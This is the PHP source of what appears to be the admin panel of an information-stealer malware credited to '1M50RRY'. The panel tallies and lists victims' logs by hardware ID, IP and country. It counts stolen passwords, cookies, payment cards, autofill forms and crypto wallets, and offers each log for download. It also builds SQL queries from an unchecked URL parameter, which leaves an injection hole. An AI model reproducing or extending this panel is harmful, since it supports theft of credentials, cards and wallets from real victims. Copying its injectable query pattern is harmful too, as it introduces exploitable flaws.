<?php
    session_start();
    if($_SESSION['auth'] != 'true'){
        header("Location: index.php");
        die();
    }
?>
<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <!-- The above 3 meta tags *must* come first in the head; any other head content must come *after* these tags -->
    <title></title>

    <!-- Bootstrap -->

    <link href="css/style_table.css" rel="stylesheet">
    <link href="css/bootstrap.css" rel="stylesheet">
    <link href="css/bootstrap-theme.css" rel="stylesheet">
    <!-- HTML5 shim and Respond.js for IE8 support of HTML5 elements and media queries -->
    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
    <!--[if lt IE 9]>
      <script src="https://oss.maxcdn.com/html5shiv/3.7.3/html5shiv.min.js"></script>
      <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
    <![endif]-->
        <!-- jQuery (necessary for Bootstrap's JavaScript plugins) -->
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.12.4/jquery.min.js"></script>
    <!-- Include all compiled plugins (below), or include individual files as needed -->

    <script src="js/bootstrap.js"></script>
  </head>
    <body style = "background-image: url(/img/3.jpg);">
    <nav class="navbar navbar-inverse">
        
            <div class="container-fluid">
                <div class="navbar-header">
                <?php
                    include('config.php');
                    $nick = mysql_fetch_assoc(mysql_query("SELECT `login` FROM `userinfo`"));
                    echo "<a class=\"navbar-brand\" href=\"table.php\" style=\"color:#fbbc00;text-shadow: #fbbc00 1px 1px 10px;font-weight: bold;background: url(http://darkwebs.biz/styles/stuff/images/bggold.gif);\">".$nick['login']."</a>";
                ?>
                </div>
                <ul class="nav navbar-nav">
                <li class="active"><a href="table.php">Logs</a></li>
                <li><a href="settings.php">Settings</a></li>
                
                </ul>
            </div>
        </nav>
        <div class="container">
           <div class="row">
                <?php
                include('config.php');
                $logs = 0;
                $pwd = 0;
                $cki = 0;
                $cc = 0;
                $frm = 0;
                $wlt = 0;
                $q = mysql_query("SELECT * FROM `files` WHERE `checked`='false'");

                $logs = mysql_num_rows($q);
                for ($i = 0; $i < $logs; $i++)
                {
                    $log = mysql_fetch_assoc($q);
                    $pwd += $log['passwords'];
                    $cki += $log['cookies'];
                    $cc += $log['cc'];
                    $frm += $log['autofill'];
                    $wlt += $log['wallets']; 
                }
                print 
                '
                <div class="col-sm-4"><div class="well" style="color: red; font-size: 20pt">Logs:'.$logs.'</div></div>
                <div class="col-sm-4"><div class="well" style="color: red; font-size: 20pt">Passwords:'.$pwd.'</div></div>
                <div class="col-sm-4"><div class="well" style="color: red; font-size: 20pt">Cookies:'.$cki.'</div></div>
                <div class="col-sm-4"><div class="well" style="color: red; font-size: 20pt">Cards:'.$cc.'</div></div>
                <div class="col-sm-4"><div class="well" style="color: red; font-size: 20pt">Forms:'.$frm.'</div></div>
                <div class="col-sm-4"><div class="well" style="color: red; font-size: 20pt">Wallets:'.$wlt.'</div></div>
                ';
                ?>
            </div>
            <form action="cmd.php" method="post">
                <input type="hidden" name="del" value="1">
                <input type="submit" class="btn btn-success" value="Mark all as checked">
            </form> 
            <br>          
            <table class="table table-bordered">
                <thead>
                <tr style="background-color: #4B0082; opacity: 0.9;">
                    <th>ID</th>
                    <th>HWID</th>
                    <th>IP</th>
                    <th>Country</th>
                    <th>Passwords</th>
                    <th>Cookies</th>
                    <th>Cards</th>
                    <th>Forms</th>
                    <th>Cryptowallets</th>
                    <th>Download</th>
                    <th>Mark</th>
                </tr>
                </thead>
                <tbody>
                    <?php
                        include('config.php');
                        $workers;
                        $p1 = 0;
                        $p2 = 0;
                        if(isset($_GET['p'])){
                            $p1 = $_GET['p'];
                            $t1 = $_GET['p'] * 10;
                            $workers = mysql_query("SELECT * FROM `files` WHERE `checked` != 'true' ORDER BY `id` DESC LIMIT $t1, 10");
                        }
                        else{
                            $workers = mysql_query("SELECT * FROM `files` WHERE `checked` != 'true' ORDER BY `id` DESC LIMIT 10");
                        }
                        
                        for ($i = 0; $i < mysql_num_rows($workers); $i++){
                            $curr = mysql_fetch_assoc($workers);

                            echo
                            "
                            <tr style=\"background-color: #696969; opacity: 0.9;\">
                            <td><strong>".$curr['id']."</strong></td>
                            <td><strong>".$curr['hwid']."</strong></td>
                            <td><strong>".$curr['ip']."</strong></td>
                            <td><strong>".$curr['country']."</strong></td>
                            <td>".$curr['passwords']."</td>
                            <td>".$curr['cookies']."</td>
                            <td>".$curr['cc']."</td>
                            <td>".$curr['autofill']."</td>
                            <td>".$curr['wallets']."</td>
                            <td><a style='color: blue' href='/".$curr['file']."'><button type='submit' class='btn btn-success'>Download</button></a></td>
                            <td><form action='cmd.php' method='post'><input type='hidden' name='checked' value='".$curr['id']."'><input type='submit' class='btn btn-success' value='Mark as checked'></form></td>
                            </tr>
                            ";
                        }
                        if(mysql_num_rows(mysql_query("SELECT * FROM `files`")) > 10){
                            $p11 = $p1 - 1;
                            $p1 += 1;
                            echo
                            "
                            <ul class=\"pager\">
                                <li><a href=\"?p=$p11\">Previous</a></li>
                                <li><a href=\"?p=$p1\">Next</a></li>
                            </ul>
                            ";
                        }

                    ?>
                </tbody>
            </table>
        </div>
            <nav class="navbar navbar-default navbar-fixed-bottom" style='opacity: 0.7'>

        
            <div class="container-fluid">
                <div class="navbar-header">
               <a class="navbar-brand" href="https://t.me/ims0rry">created by 1M50RRY</a>
                </div>
                
            </div>
        </nav>
        <?php
        mysql_close($dbcnx);
        ?>
    </body>
</html>